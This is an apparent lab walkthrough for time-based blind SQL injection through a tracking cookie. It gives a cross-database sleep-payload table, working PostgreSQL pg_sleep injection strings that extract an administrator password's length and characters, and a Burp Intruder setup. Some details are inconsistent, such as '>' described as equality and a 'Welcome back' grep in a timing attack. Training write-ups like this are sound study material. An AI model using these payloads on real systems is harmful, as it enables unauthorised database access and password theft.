# Lab: Blind SQL injection with time delays and information retrieval
## Lab

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs an SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and the application does not respond any differently based on whether the query returns any rows or causes an error. However, since the query is executed synchronously, it is possible to trigger conditional time delays to infer information.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind __SQL injection__ vulnerability to find out the `password` of the `administrator` user.

To solve the lab, log in as the `administrator` user. 

## Hint

You can find some useful payloads on our SQL injection cheat sheet. 

## Solution

When a request containing a `TrackingId` cookie is processed, the application determines whether this is a known user using an SQL query like this: 
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
Because SQL queries are generally processed synchronously by the application, delaying the execution of an SQL query will also delay the HTTP response. This allows us to infer the truth of the injected condition based on the time taken before the HTTP response is received. 

From cheat sheet we fuzz payload:
|SQL Server |Payload                                                                                                                                        |
|-----------|-----------------------------------------------------------------------------------------------------------------------------------------------|
|Oracle     |<code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'&#124;&#124;dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual            </code>|
|Microsoft  |<code>IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10'                                                                                   </code>|
|PostgreSQL |<code>SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END                                                     </code>|
|MySQL      |<code>SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')                                                                                      </code>|

We have payload:
`'||(SELECT CASE WHEN ((SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a') THEN pg_sleep(3) ELSE pg_sleep(0) END)--`

The query like this:
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'||(SELECT CASE WHEN ((SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a') THEN pg_sleep(3) ELSE pg_sleep(0) END)--'  
```
If the length of password greater than 1, the time of HTTP response is greater than 3 seconds.

Continue to increase the length to 2, 3, 4, ... until the time of HTTP response isn't greater than 3 seconds, this number is the password length we look for.

Increase length to 20 (LENGTH(password) > 20) the time of HTTP response isn't greater than 3 seconds. So password length is 20.

After determined length of password we brute force value of each character in each index of password. To do that we need use `SUBSTRING()` function:
`'||(SELECT CASE WHEN ((SELECT 'a' FROM users WHERE username='administrator' AND SUBSTR(password,1,1)>'a')='a') THEN pg_sleep(3) ELSE pg_sleep(0) END)--`
To put it simply `SUBSTRING(string,index,length)` function extract `string` from `index` with `length` is number of characters. Addition condition above take first character in password compare with character 'a', if the first character of password is 'a' the time delay is 3 seconds. But no one does it manually :v
Send this request into Intruder and modify payload:
`'||(SELECT CASE WHEN ((SELECT 'a' FROM users WHERE username='administrator' AND SUBSTR(password,1,1)>'a')='a') THEN pg_sleep(3) ELSE pg_sleep(0) END)--`
When the query like this:
```SQL
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = '7gTCiXoIdLi8ksjO'||(SELECT CASE WHEN ((SELECT 'a' FROM users WHERE username='administrator' AND SUBSTR(password,1,1)>'a')='a') THEN pg_sleep(3) ELSE pg_sleep(0) END)--'
```

And select attack type is Cluster bomb.The first payload type is numbers from 1 to 20 and step is 1, the second payload type is simple list and we add characters a-z and 0-9, combimed with rep _Welcome back_ in tab Options.

> administrator - 0lubt1uzmvmrc9gezn7y